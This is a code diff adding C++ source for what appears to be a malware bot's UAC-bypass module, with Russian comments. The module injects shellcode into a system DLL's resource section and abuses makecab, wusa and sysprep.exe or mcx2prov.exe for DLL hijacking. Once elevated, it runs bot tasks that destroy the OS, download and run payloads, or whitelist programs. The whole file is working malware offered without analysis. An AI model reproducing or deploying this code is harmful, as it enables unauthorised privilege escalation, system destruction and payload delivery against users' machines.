@@ -1,0 +1,428 @@
+#include "UAC_bypass.h"
+#include "modules.h"
+#include "GetApi.h"
+#include "utils.h"
+#include "BotCore.h"
+#include "KillOs_Reboot.h"
+#include "inject.h"
+
+#include "BotDebug.h"
+
+#ifdef PP_DPRINTF
+	#define DBG PP_DPRINTF
+#else
+	#define DBG(...)
+#endif //PP_DPRINTF
+
+static const char* uacTargetDir[] = { "system32\\sysprep", "ehome" };
+static const char* uacTargetApp[] = { "sysprep.exe",		"mcx2prov.exe" };
+static const char* uacTargetDll[] = { "cryptbase.dll",		"CRYPTSP.dll" };
+static const char* uacTargetMsu[] = { "cryptbase.msu",		"CRYPTSP.msu" };
+
+static bool Exec( DWORD* exitCode, char *msg, ... );
+static bool InfectImage( PVOID data, DWORD dataSize, char *dllPath, char *commandLine );
+
+bool RunDllBypassUAC( const LPVOID module, int szModule, int method )
+{
+	bool ret = false;
+	//проверяем в нужной ли версии винды находимся
+    OSVERSIONINFOA Version;    
+    Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
+    if( pGetVersionExA(&Version) )
+    {		    
+        if( Version.dwPlatformId != VER_PLATFORM_WIN32_NT ||
+            Version.dwMajorVersion != 6 || !(Version.dwMinorVersion == 1 || Version.dwMinorVersion == 2) )
+        {
+            return false;
+        }        
+    }
+    char engineDll[MAX_PATH];
+	File::GetTempName(engineDll);
+
+    DBG( "Saving engine DLL into the '%s'", engineDll );
+    
+    // write payload DLL into the temporary location
+	if( File::WriteBufferA( engineDll, module, szModule ) != szModule ) return false;
+
+    char targetDll[MAX_PATH], targetDllInfected[MAX_PATH];
+
+    pGetSystemDirectoryA( targetDll, MAX_PATH );
+	pPathAppendA( targetDll, uacTargetDll[method] );
+
+    pGetTempPathA( MAX_PATH, targetDllInfected );
+	pPathAppendA( targetDllInfected, uacTargetDll[method] );
+
+    void* data = NULL;
+    DWORD dataSize = 0;
+
+    DBG( "Reading and infecting '%s'", targetDll );
+
+    // read hijacking dll and infect it
+	data = File::ReadToBufferA( targetDll, dataSize );
+    if( data )
+    {
+        if( InfectImage( data, dataSize, engineDll, 0 ) )
+        {
+            DBG( "Saving infected DLL to '%s'", targetDllInfected);
+
+            // write infected hijacking DLL into the temporary location
+			if( File::WriteBufferA( targetDllInfected, data, dataSize ) )
+            {
+                char msuPath[MAX_PATH];
+                pGetTempPathA( MAX_PATH, msuPath );
+                pPathAppendA( msuPath, uacTargetMsu[method] );
+
+                // delete old .msu file
+                pDeleteFileA(msuPath);
+
+                DBG( "Creating MSU file '%s'", msuPath);
+
+                // make .msu archive
+                Exec( 0, "makecab.exe /V1 %s %s", targetDllInfected, msuPath);
+				if( File::IsExists(msuPath) )
+                {        
+                    char targetPath[MAX_PATH], targetDllPath[MAX_PATH];
+
+                    pGetWindowsDirectoryA( targetPath, MAX_PATH - 1 );
+					pPathAppendA( targetPath, uacTargetDir[method] );
+					pPathAppendA( targetPath, uacTargetApp[method] );
+
+                    pGetWindowsDirectoryA( targetDllPath, MAX_PATH - 1 );
+					pPathAppendA( targetDllPath, uacTargetDir[method] );
+					pPathAppendA( targetDllPath, uacTargetDll[method] );
+
+                    DBG( "Extracting MSU data to '%s'", targetDllPath );
+
+                    // extract dll file into the vulnerable app directory
+                    Exec(NULL, "cmd.exe /C wusa.exe %s /extract:%%WINDIR%%\\%s", msuPath, uacTargetDir[method] );                
+					if( File::IsExists(targetDllPath) )
+                    {
+                        DWORD exitCode = 0;
+
+                        DBG( "Executing '%s'", targetPath );
+
+                        // execute vulnerable application and perform DLL hijacking attack
+                        if( Exec( &exitCode, "cmd.exe /C %s", targetPath ) )
+                        {
+                            if( exitCode == UAC_BYPASS_MAGIC_RETURN_CODE )
+                            {
+                                DBG( "UAC BYPASS SUCCESS" );
+                                ret = true;
+                            }
+                            else
+                            {
+                                DBG( "UAC BYPASS FAILS" );
+                            }
+                        }
+
+                        pDeleteFileA(targetDllPath);
+                    }
+                    else
+                        DBG( "Error while extracting '%s' from MSU archive", targetDllPath );
+
+                    pDeleteFileA(msuPath);
+                }
+                else
+                    DBG( "Error while creating '%s'", msuPath );
+            }
+        }
+
+        MemFree(data);
+    }
+
+    pDeleteFileA(targetDllInfected);
+    pDeleteFileA(engineDll);
+
+    return ret;
+}
+
+static bool Exec( DWORD* exitCode, char *msg, ... )
+{
+    bool ret = false;
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+    if( exitCode ) *exitCode = 0;
+
+    va_list mylist;
+    va_start( mylist, msg );
+
+	TMemory buf(1024);
+    pwvsprintfA( buf.AsStr(), msg, mylist );	
+    va_end(mylist);    
+
+	ClearStruct(pi);
+	ClearStruct(si);
+    si.cb = sizeof(si);    
+
+    pGetStartupInfoA(&si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = FALSE;
+
+	DBG( "CreateProcess(): %s", buf.AsStr() );
+    if( pCreateProcessA( NULL, buf.AsStr(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) )
+    {
+        pWaitForSingleObject( pi.hProcess, INFINITE );
+
+        if( exitCode )
+            pGetExitCodeProcess( pi.hProcess, exitCode );
+
+        pCloseHandle(pi.hThread);
+        pCloseHandle(pi.hProcess);
+
+        ret = TRUE;
+    }
+    else
+        DBG( "CreateProcess() ERROR %d", pGetLastError() );
+
+    return ret;
+}
+
+typedef HMODULE (WINAPI * func_LoadLibraryA)(LPCTSTR lpFileName);
+typedef UINT (WINAPI * func_WinExec)(LPCSTR lpCmdLine, UINT uCmdShow);
+typedef BOOL (WINAPI * DLL_MAIN)(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved);
+
+typedef struct _SHELLCODE_PARAMS
+{
+    func_LoadLibraryA f_LoadLibraryA;
+    func_WinExec f_WinExec;
+
+    DWORD dwAddressofEntryPoint;
+
+    char szCommandLine[MAX_PATH];
+    char szDllPath[];
+
+} SHELLCODE_PARAMS, *PSHELLCODE_PARAMS;
+
+extern "C" BOOL WINAPI Shellcode( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved );
+extern "C" VOID WINAPI Shellcode_end(VOID);
+
+#pragma optimize("", off)
+
+BOOL WINAPI Shellcode( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved )
+{
+    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)((PUCHAR)hModule + ((PIMAGE_DOS_HEADER)hModule)->e_lfanew);
+
+    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)
+            (headers->FileHeader.SizeOfOptionalHeader + 
+            (PUCHAR)&headers->OptionalHeader);
+
+    DWORD numberOfSections = headers->FileHeader.NumberOfSections;
+
+    PSHELLCODE_PARAMS params = NULL;
+
+    // enumerate sections
+    for( int i = 0; i < (int)numberOfSections; i++ )
+    {   
+        // check for resources section
+        if( *(PDWORD)&section->Name == 'rsr.' )
+        {
+            params = (PSHELLCODE_PARAMS)((PUCHAR)hModule + section->VirtualAddress);
+            break;
+        }
+
+        section++;
+    }       
+
+    if (params == NULL)
+    {
+        // shellcode parameters is not found
+        return TRUE;
+    }
+
+    // get address of original entry point
+    DLL_MAIN DllMain = (DLL_MAIN)((PUCHAR)hModule + params->dwAddressofEntryPoint);
+
+    // call original entry point
+    BOOL ret = DllMain( hModule, ul_reason_for_call, lpReserved );
+
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
+    {
+        if( params->f_WinExec )
+        {
+            // execute payload
+            params->f_WinExec( params->szCommandLine, SW_SHOWNORMAL );
+        }
+
+        if( params->f_LoadLibraryA )
+        {
+            // load helper library
+            params->f_LoadLibraryA( params->szDllPath );
+        }        
+    }
+
+    return ret;
+}
+
+VOID WINAPI Shellcode_end(VOID) {}
+
+#pragma optimize("", on)
+
+static bool InfectImage( PVOID data, DWORD dataSize, char *dllPath, char *commandLine )
+{
+    DWORD shellcodeSize = (DWORD)((PUCHAR)&Shellcode_end - (PUCHAR)&Shellcode);
+    DWORD totalSize = shellcodeSize + sizeof(SHELLCODE_PARAMS) + m_lstrlen(dllPath) + 1;
+
+    DBG( "Shellcode size is %d bytes", totalSize);
+
+    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
+        ((PUCHAR)data + ((PIMAGE_DOS_HEADER)data)->e_lfanew);
+
+    PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)
+        (headers->FileHeader.SizeOfOptionalHeader + 
+        (PUCHAR)&headers->OptionalHeader);
+
+    DWORD numberOfSections = headers->FileHeader.NumberOfSections;
+
+    // enumerate sections
+    for( int i = 0; i < (int)numberOfSections; i++ )
+    {   
+        // check for resources section
+        if( !m_memcmp( (char*)&section->Name, ".rsrc", 5) )
+        {
+            if( section->SizeOfRawData < totalSize )
+            {
+                DBG( "ERROR: Not enough free space in '.rsrc'" );
+                return false;
+            }
+
+            // fill shellcode parameters
+            PSHELLCODE_PARAMS params = (PSHELLCODE_PARAMS)((PUCHAR)data + section->PointerToRawData);
+            m_memset( params, 0, sizeof(SHELLCODE_PARAMS) );
+
+            params->dwAddressofEntryPoint = headers->OptionalHeader.AddressOfEntryPoint;
+            
+			HMODULE kernel32 = (HMODULE)pGetModuleHandleA("kernel32.dll");
+            params->f_LoadLibraryA = (func_LoadLibraryA)pGetProcAddress( kernel32, "LoadLibraryA" );
+
+            params->f_WinExec = (func_WinExec)pGetProcAddress( kernel32, "WinExec" );
+
+            if( commandLine )
+                m_lstrcpy( params->szCommandLine, commandLine );
+
+            m_lstrcpy( params->szDllPath, dllPath );
+
+            // copy shellcode
+            PVOID shellcode = (PVOID)((PUCHAR)params + sizeof(SHELLCODE_PARAMS) + m_lstrlen(dllPath) + 1);
+            m_memcpy( shellcode, Shellcode, shellcodeSize);
+
+            // replace address of entry point
+            headers->OptionalHeader.AddressOfEntryPoint = section->VirtualAddress + 
+                sizeof(SHELLCODE_PARAMS) + m_lstrlen(dllPath) + 1;
+
+            // make section executable
+            section->Characteristics |= IMAGE_SCN_MEM_EXECUTE;
+
+            headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress = NULL;
+            headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_RESOURCE].Size = 0;
+
+            DWORD headerSum = 0, checkSum = 0;
+
+            // recalculate checksum
+            if( pCheckSumMappedFile( data, dataSize, &headerSum, &checkSum ) )
+                headers->OptionalHeader.CheckSum = checkSum;
+            else
+                DBG( "CheckSumMappedFile() ERROR %d", pGetLastError() );
+
+            DBG( "OK" );
+
+            break;
+        }
+
+        section++;
+    } 
+
+    return true;
+}
+
+bool ConvertExeToDll( LPVOID module )
+{
+    PIMAGE_NT_HEADERS headers = (PIMAGE_NT_HEADERS)
+        ((PUCHAR)module + ((PIMAGE_DOS_HEADER)module)->e_lfanew);
+	headers->FileHeader.Characteristics |= IMAGE_FILE_DLL;
+	return true;
+}
+
+//формат файла в котором будем сохранять команду для выполнения после обхода UAC
+struct BypassUACTask
+{
+	DWORD time; //время создания задачи
+	int task;
+	int lenArgs;
+	char args[];
+};
+
+const char* FileTask = "task_bypassuac.txt";
+
+bool RunBotBypassUAC( int method, int task, const char* args )
+{
+	bool ret = false;
+	method = 0; //используем только метод обхода 0
+	string path = BOT::GetBotFullExeName();
+	DBG( "Exe бота %s превращаем в длл", path.t_str() );
+	DWORD dataSize;
+	BYTE* data = File::ReadToBufferA( path.t_str(), dataSize );
+	if( data == 0 ) return false;
+	if( ConvertExeToDll(data) )
+	{
+		int lenArgs = m_lstrlen(args); //размер памяти под аргументы
+		int szTask = sizeof(BypassUACTask) + lenArgs + 1;
+		BypassUACTask* ptask = (BypassUACTask*)MemAlloc(szTask);
+		ptask->time = (DWORD)pGetTickCount();
+		ptask->task = task;
+		ptask->lenArgs = lenArgs;
+		m_memcpy( ptask->args, args, lenArgs + 1 );
+		if( File::WriteBufferA(BOT::MakeFileName( 0, FileTask ).t_str(), ptask, szTask ) == szTask )
+		{
+			ret = RunDllBypassUAC( data, dataSize, method );
+			if( !ret ) //по какой-то причине не сработало
+				pDeleteFileA(BOT::MakeFileName( 0, FileTask ).t_str() );
+		}
+		MemFree(ptask);
+	}
+	MemFree(data);
+	return ret;
+}
+
+static char ParamArgs[MAX_PATH]; //сюда ложатся аргументы команды, если выполнение в другом процессе
+
+static DWORD WINAPI TaskDownload2(void*)
+{
+	BOT::Initialize(ProcessUnknown);
+	ExecuteDownload( 0, 0, ParamArgs );
+	return 0;
+}
+
+int ExecTaskAfterUAC()
+{
+	string pathFile = BOT::MakeFileName( 0, FileTask );
+	DWORD szTask;
+	BypassUACTask* ptask = (BypassUACTask*)File::ReadToBufferA( pathFile.t_str(), szTask );
+	int ret = 0;
+	if( ptask )
+	{
+		pDeleteFileA(pathFile.t_str());
+		//если разница > 10с, то значит файл не был удален по какой-то причине, другими словами задач нет, обычный запуск бота
+		if( GetTickCount() - ptask->time > 20000 ) 
+			return 0;
+		BOT::SetBotType(BotBypassUAC);
+		DBG( "Запущена команда %d '%s' после обхода UAC", ptask->task, ptask->args );
+		switch( ptask->task )
+		{
+			case UAC_CMD_KillOs:
+				ret = KillOs() ? 1 : 2;
+				break;
+			case UAC_CMD_Download:
+				ret = TRUE;
+				SafeCopyStr( ParamArgs, sizeof(ParamArgs), ptask->args );
+				MegaJump(TaskDownload2);
+				break;
+			case UAC_CMD_AddAllowed:
+				AddAllowedprogram( ptask->args );
+				ret = TRUE;
+				break;
+		}
+		MemFree(ptask);
+		pExitProcess(UAC_BYPASS_MAGIC_RETURN_CODE);
+	}
+	return ret;
+}
